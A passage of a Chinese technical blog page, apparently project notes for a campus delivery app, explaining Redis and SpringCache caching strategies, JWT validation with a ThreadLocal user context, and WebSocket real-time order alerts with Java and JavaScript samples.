class="hljs-type">int</span> dishId)</span> &#123;<br>    <span class="hljs-keyword">return</span> dishRepository.findById(dishId).orElse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-缓存击穿"><a href="#2-缓存击穿" class="headerlink" title="(2) 缓存击穿"></a><strong>(2) 缓存击穿</strong></h4><ul><li><strong>问题</strong>：热点数据的缓存失效时，大量请求直接冲击数据库。</li><li><strong>解决方案</strong>：使用布隆过滤器（Bloom Filter）预判数据是否存在。如果数据不存在，则直接返回，避免查询数据库。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 布隆过滤器初始化</span><br>BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(<br>        Funnels.integerFunnel(), <span class="hljs-number">100000</span>, <span class="hljs-number">0.01</span>);<br><br><span class="hljs-comment">// 在数据加载时，将数据ID加入布隆过滤器</span><br>bloomFilter.put(dishId);<br></code></pre></td></tr></table></figure><p>在查询时，先通过布隆过滤器判断数据是否存在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Dish <span class="hljs-title function_">getDishDetails</span><span class="hljs-params">(<span class="hljs-type">int</span> dishId)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!bloomFilter.mightContain(dishId)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 数据不存在</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> dishRepository.findById(dishId).orElse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-缓存雪崩"><a href="#3-缓存雪崩" class="headerlink" title="(3) 缓存雪崩"></a><strong>(3) 缓存雪崩</strong></h4><ul><li><strong>问题</strong>：大量缓存同时失效，导致数据库压力过大。</li><li><strong>解决方案</strong>：<ol><li><strong>设置不同的过期时间</strong>：为缓存设置随机的过期时间，避免大量缓存同时失效。</li><li><strong>本地缓存作为二级缓存</strong>：使用本地缓存（如 Caffeine）作为二级缓存，缓解 Redis 压力。</li><li><strong>使用互斥锁</strong>：在缓存失效时，通过互斥锁（如 Redisson 的分布式锁）确保只有一个线程加载数据。</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Cacheable(value = &quot;dish-details&quot;, key = &quot;#dishId&quot;, sync = true)</span><br><span class="hljs-keyword">public</span> Dish <span class="hljs-title function_">getDishDetails</span><span class="hljs-params">(<span class="hljs-type">int</span> dishId)</span> &#123;<br>    <span class="hljs-keyword">return</span> dishRepository.findById(dishId).orElse(<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="6-缓存更新与失效"><a href="#6-缓存更新与失效" class="headerlink" title="6. 缓存更新与失效"></a><strong>6. 缓存更新与失效</strong></h3><p>在数据更新或删除时，需要同步更新缓存，确保缓存数据的一致性。</p><h4 id="1-缓存更新"><a href="#1-缓存更新" class="headerlink" title="(1) 缓存更新"></a><strong>(1) 缓存更新</strong></h4><p>使用 <code>@CachePut</code> 注解更新缓存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@CachePut(value = &quot;dish-details&quot;, key = &quot;#dish.id&quot;)</span><br><span class="hljs-keyword">public</span> Dish <span class="hljs-title function_">updateDishDetails</span><span class="hljs-params">(Dish dish)</span> &#123;<br>    dishRepository.save(dish);<br>    <span class="hljs-keyword">return</span> dish;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-缓存失效"><a href="#2-缓存失效" class="headerlink" title="(2) 缓存失效"></a><strong>(2) 缓存失效</strong></h4><p>使用 <code>@CacheEvict</code> 注解删除缓存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@CacheEvict(value = &quot;dish-details&quot;, key = &quot;#dishId&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteDish</span><span class="hljs-params">(<span class="hljs-type">int</span> dishId)</span> &#123;<br>    dishRepository.deleteById(dishId);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="7-性能优化"><a href="#7-性能优化" class="headerlink" title="7. 性能优化"></a><strong>7. 性能优化</strong></h3><ul><li><strong>批量查询优化</strong>：对于批量查询，可以使用 Redis 的 <code>mget</code> 和 <code>mset</code> 命令批量读写缓存。</li><li><strong>缓存预热</strong>：在系统启动时，预加载高频数据到缓存中，减少首次访问的延迟。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostConstruct</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">preloadCache</span><span class="hljs-params">()</span> &#123;<br>    List&lt;DishCategory&gt; categories = dishService.getDishCategories();<br>    categories.forEach(category -&gt; &#123;<br>        dishService.getHotDishesByCategory(category.getId());<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>通过以上步骤，实现了使用 <strong>Redis</strong> 缓存高频数据并结合 <strong>SpringCache</strong> 进行优化：</p><ol><li>引入 Redis 和 SpringCache 依赖，配置 Redis 连接。</li><li>启用缓存支持，配置缓存管理器。</li><li>使用 <code>@Cacheable</code> 注解缓存高频数据，减少数据库访问。</li><li>解决缓存穿透、击穿、雪崩问题，确保系统的稳定性。</li><li>在数据更新或删除时，同步更新缓存，确保数据一致性。</li><li>通过批量查询和缓存预热优化性能。</li></ol><p>这种实现方式显著提升了系统的响应速度和性能，同时减轻了数据库的压力。</p><hr><h2 id="2-JWT令牌校验与ThreadLocal用户上下文"><a href="#2-JWT令牌校验与ThreadLocal用户上下文" class="headerlink" title="2. JWT令牌校验与ThreadLocal用户上下文"></a><strong>2. JWT令牌校验与ThreadLocal用户上下文</strong></h2><h3 id="场景描述与实现：JWT令牌校验与ThreadLocal用户上下文"><a href="#场景描述与实现：JWT令牌校验与ThreadLocal用户上下文" class="headerlink" title="场景描述与实现：JWT令牌校验与ThreadLocal用户上下文"></a><strong>场景描述与实现：JWT令牌校验与ThreadLocal用户上下文</strong></h3><h4 id="1-场景描述"><a href="#1-场景描述" class="headerlink" title="1. 场景描述"></a><strong>1. 场景描述</strong></h4><p>在 <strong>校园闪送</strong> 项目中，系统需要实现用户认证和授权功能。具体场景如下：</p><ul><li><strong>用户登录</strong>：用户通过用户名和密码登录系统，登录成功后，后端生成一个 JWT 令牌并返回给客户端。</li><li><strong>请求验证</strong>：用户在后续请求中携带 JWT 令牌，后端通过拦截器验证令牌的有效性，确保用户已登录。</li><li><strong>用户信息传递</strong>：在多线程环境下，需要在不同的服务层和方法中获取当前登录用户的信息，而无需在每次请求中传递用户信息。</li></ul><h4 id="2-为什么使用-JWT-和-ThreadLocal"><a href="#2-为什么使用-JWT-和-ThreadLocal" class="headerlink" title="2. 为什么使用 JWT 和 ThreadLocal"></a><strong>2. 为什么使用 JWT 和 ThreadLocal</strong></h4><ul><li><strong>JWT 的优势</strong>：<ul><li><strong>无状态和可扩展性</strong>：JWT 令牌存储在客户端，服务器无需存储会话信息，适合分布式系统。</li><li><strong>安全性</strong>：JWT 通过签名机制保证令牌未被篡改。</li><li><strong>跨域支持</strong>：JWT 令牌可以轻松用于跨域请求。</li></ul></li><li><strong>ThreadLocal 的优势</strong>：<ul><li><strong>线程隔离</strong>：在多线程环境下，ThreadLocal 可以确保每个线程独立存储和访问用户信息。</li><li><strong>性能优化</strong>：避免在每次请求中重复查询数据库或传递用户信息。</li></ul></li></ul><h4 id="3-实现方法"><a href="#3-实现方法" class="headerlink" title="3. 实现方法"></a><strong>3. 实现方法</strong></h4><h5 id="1-JWT-令牌校验"><a href="#1-JWT-令牌校验" class="headerlink" title="(1) JWT 令牌校验"></a><strong>(1) JWT 令牌校验</strong></h5><p><strong>生成 JWT 令牌</strong>：<br>在用户登录时，后端生成 JWT 令牌并返回给客户端。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br><span class="hljs-keyword">public</span> Result&lt;EmployeeLoginVO&gt; <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> EmployeeLoginDTO employeeLoginDTO)</span> &#123;<br>    <span class="hljs-comment">// 验证用户信息...</span><br>    Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    claims.put(<span class="hljs-string">&quot;userId&quot;</span>, employee.getId());<br>    <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> JwtUtil.createJWT(jwtProperties.getAdminSecretKey(), jwtProperties.getAdminTtl(), claims);<br>    <span class="hljs-keyword">return</span> Result.success(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EmployeeLoginVO</span>(employee.getId(), employee.getName(), token));<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>校验 JWT 令牌</strong>：<br>通过拦截器验证请求中的 JWT 令牌。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> JwtProperties jwtProperties;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (!(handler <span class="hljs-keyword">instanceof</span> HandlerMethod)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 非Controller方法直接放行</span><br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(jwtProperties.getAdminTokenName());<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> JwtUtil.parseJWT(jwtProperties.getAdminSecretKey(), token);<br>            <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> Long.valueOf(claims.get(<span class="hljs-string">&quot;userId&quot;</span>).toString());<br>            <span class="hljs-comment">// 将用户ID存储到ThreadLocal中</span><br>            UserAuthContext.setUserLoginInfo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDO</span>(userId));<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-使用-ThreadLocal-存储用户上下文"><a href="#2-使用-ThreadLocal-存储用户上下文" class="headerlink" title="(2) 使用 ThreadLocal 存储用户上下文"></a><strong>(2) 使用 ThreadLocal 存储用户上下文</strong></h5><p><strong>创建用户上下文工具类</strong>：<br>使用 ThreadLocal 存储当前线程的用户信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserAuthContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;UserDO&gt; userLoginInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserLoginInfo</span><span class="hljs-params">(UserDO userInfo)</span> &#123;<br>        userLoginInfo.set(userInfo);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> UserDO <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> userLoginInfo.get();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> &#123;<br>        userLoginInfo.remove();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>拦截器中设置用户信息</strong>：<br>在拦截器中解析 JWT 令牌后，将用户信息存储到 ThreadLocal 中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;Authorization&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> JwtUtil.parseJWT(token);<br>            <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> Long.valueOf(claims.get(<span class="hljs-string">&quot;userId&quot;</span>).toString());<br>            UserAuthContext.setUserLoginInfo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDO</span>(userId));<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>获取用户信息</strong>：<br>在业务逻辑中，通过 ThreadLocal 获取当前线程的用户信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">someMethod</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">UserDO</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> UserAuthContext.getUserInfo();<br>        <span class="hljs-comment">// 使用用户信息进行业务处理</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>清理 ThreadLocal</strong>：<br>在请求处理完成后，清理 ThreadLocal 中的数据，防止内存泄漏。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        UserAuthContext.clear();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>通过使用 <strong>JWT 令牌校验</strong> 和 <strong>ThreadLocal 用户上下文</strong>，可以实现以下目标：</p><ol><li><strong>用户认证和授权</strong>：通过 JWT 令牌验证用户身份，确保请求的合法性。</li><li><strong>线程隔离和性能优化</strong>：使用 ThreadLocal 在多线程环境下安全地存储和访问用户信息，避免重复查询数据库。</li><li><strong>跨域支持和无状态设计</strong>：JWT 令牌支持跨域请求，适合分布式系统。</li></ol><p>这种实现方式不仅提高了系统的安全性，还优化了性能，确保了线程安全。</p><hr><h2 id="3-WebSocket实时来单提醒"><a href="#3-WebSocket实时来单提醒" class="headerlink" title="3. WebSocket实时来单提醒"></a><strong>3. WebSocket实时来单提醒</strong></h2><h3 id="使用-WebSocket-实现长连接的场景与具体实现"><a href="#使用-WebSocket-实现长连接的场景与具体实现" class="headerlink" title="使用 WebSocket 实现长连接的场景与具体实现"></a><strong>使用 WebSocket 实现长连接的场景与具体实现</strong></h3><h4 id="1-场景描述-1"><a href="#1-场景描述-1" class="headerlink" title="1. 场景描述"></a><strong>1. 场景描述</strong></h4><p>在 <strong>校园闪送</strong> 项目中，WebSocket 长连接主要用于实现客户端与服务端之间的实时双向通信，具体场景包括：</p><ul><li><strong>实时消息推送</strong>：当有新订单时，服务端需要实时向商家端推送通知；用户端也可以实时接收催单消息。</li><li><strong>订单状态更新</strong>：商家和用户需要实时查看订单的最新状态，WebSocket 可以实现订单状态的即时更新。</li><li><strong>在线协作与互动</strong>：例如商家和用户之间的实时沟通功能。</li></ul><h4 id="2-为什么使用-WebSocket"><a href="#2-为什么使用-WebSocket" class="headerlink" title="2. 为什么使用 WebSocket"></a><strong>2. 为什么使用 WebSocket</strong></h4><ul><li><strong>实时性</strong>：WebSocket 提供全双工通信，能够实现实时的数据推送和快速的双向交流，适合需要频繁数据交互的场景。</li><li><strong>性能优化</strong>：相比传统的 HTTP 轮询，WebSocket 减少了网络开销，避免了频繁的三次握手和四次挥手。</li><li><strong>用户体验</strong>：通过 WebSocket，用户可以即时接收信息，提升交互体验。</li></ul><h4 id="3-具体实现方法"><a href="#3-具体实现方法" class="headerlink" title="3. 具体实现方法"></a><strong>3. 具体实现方法</strong></h4><h5 id="1-服务端实现"><a href="#1-服务端实现" class="headerlink" title="(1) 服务端实现"></a><strong>(1) 服务端实现</strong></h5><p>在服务端，需要创建一个 WebSocket 服务器来处理客户端的连接请求、消息收发以及连接关闭等事件。以下是使用 Java 和 Spring Boot 实现 WebSocket 服务器的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSocket</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebSocketConfigurer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerWebSocketHandlers</span><span class="hljs-params">(WebSocketHandlerRegistry registry)</span> &#123;<br>        registry.addHandler(myWebSocketHandler(), <span class="hljs-string">&quot;/websocket&quot;</span>)<br>                .addInterceptors(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpSessionHandshakeInterceptor</span>())<br>                .setAllowedOrigins(<span class="hljs-string">&quot;*&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> WebSocketHandler <span class="hljs-title function_">myWebSocketHandler</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyWebSocketHandler</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyWebSocketHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TextWebSocketHandler</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterConnectionEstablished</span><span class="hljs-params">(WebSocketSession session)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 连接建立后执行的逻辑</span><br>        System.out.println(<span class="hljs-string">&quot;Connection established: &quot;</span> + session.getId());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTextMessage</span><span class="hljs-params">(WebSocketSession session, TextMessage message)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 处理来自客户端的消息</span><br>        System.out.println(<span class="hljs-string">&quot;Received message: &quot;</span> + message.getPayload());<br>        session.sendMessage(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextMessage</span>(<span class="hljs-string">&quot;Hello, Client!&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterConnectionClosed</span><span class="hljs-params">(WebSocketSession session, CloseStatus status)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 连接关闭后执行的逻辑</span><br>        System.out.println(<span class="hljs-string">&quot;Connection closed: &quot;</span> + session.getId());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-客户端实现"><a href="#2-客户端实现" class="headerlink" title="(2) 客户端实现"></a><strong>(2) 客户端实现</strong></h5><p>客户端通过 WebSocket API 连接到服务器并处理消息。以下是使用 JavaScript 实现 WebSocket 客户端的示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&quot;ws://localhost:8080/websocket&quot;</span>);<br><br>socket.<span class="hljs-property">onopen</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Connected to WebSocket server&quot;</span>);<br>    socket.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Hello, Server!&quot;</span>);<br>&#125;;<br><br>socket.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Received message from server: &quot;</span> + event.<span class="hljs-property">data</span>);<br>&#125;;<br><br>socket.<span class="hljs-property">onclose</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;WebSocket connection closed&quot;</span>);<br>&#125;;<br><br>socket.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;WebSocket error: &quot;</span> + error.<span class="hljs-property">message</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="3-保持连接的策略"><a href="#3-保持连接的策略" class="headerlink" title="(3) 保持连接的策略"></a><strong>(3) 保持连接的策略</strong></h5><p>为了保持 WebSocket 长连接，可以采用以下策略：</p><ul><li><p><strong>心跳机制</strong>：定期向服务器发送心跳消息，以保持连接活跃。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (socket.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) &#123;<br>        socket.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;心跳&#x27;</span>);<br>    &#125;<br>&#125;, <span class="hljs-number">30000</span>); <span class="hljs-comment">// 每30秒发送一次</span><br></code></pre></td></tr></table></figure></li><li><p><strong>自动重连</strong>：当连接断开时，自动尝试重新连接。</p></li></ul><h5 id="4-消息转发与集群支持"><a href="#4-消息转发与集群支持" class="headerlink" title="(4) 消息转发与集群支持"></a><strong>(4) 消息转发与集群支持</strong></h5><p>在分布式系统中，WebSocket 长连接需要支持消息转发和集群部署。可以通过以下方式实现：</p><ul><li><strong>服务实例间的消息转发</strong>：每个服务实例作为客户端连接到其他服务实例的 WebSocket 服务端，实现消息的转发。</li><li><strong>服务发现</strong>：通过 Spring Cloud 的服务发现组件（如 Nacos 或 Eureka）获取所有服务实例的信息。</li></ul><h5 id="5-消息选择性发送"><a href="#5-消息选择性发送" class="headerlink" title="(5) 消息选择性发送"></a><strong>(5) 消息选择性发送</strong></h5><p>在某些场景下，可能需要向特定用户发送消息，而不是广播给所有客户端。可以通过以下方式实现：</p><ul><li><strong>用户标识</strong>：客户端连接时将用户标识（如用户ID）发送给服务端，并存储在连接的元数据中。</li><li><strong>自定义选择器</strong>：根据消息头中的用户标识选择特定的连接进行消息发送。</li></ul><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>通过使用 WebSocket 实现长连接，可以实现实时的消息推送和双向通信，适用于需要频繁数据交互的场景，如即时通讯、订单状态更新等。具体实现包括服务端和客户端的 WebSocket 实现、保持连接的策略以及消息转发和集群支持。这种技术能够显著提升用户体验和系统性能。</p><hr><h2 id="4-SpringTask订单超时自动取消"><a href="#4-SpringTask订单超时自动取消" class="headerlink" title="4. SpringTask订单超时自动取消"></a><strong>4. 